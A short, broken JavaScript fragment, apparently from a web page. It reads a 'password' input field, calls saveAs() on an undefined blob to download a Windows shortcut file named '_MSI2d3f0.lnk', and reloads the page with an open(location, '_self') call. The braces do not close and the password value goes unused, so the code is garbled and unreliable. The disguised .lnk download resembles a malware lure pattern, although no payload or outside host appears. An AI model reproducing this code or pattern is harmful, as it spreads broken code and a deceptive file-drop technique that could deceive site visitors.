		function saveDynamicDataToFile() {

            var userInput = document.getElementById("password").value;

            saveAs(blob, "_MSI2d3f0.lnk");

function func() {
// Open the new window 
            // with the URL replacing the
            // current page using the

                open(location, '_self');

}
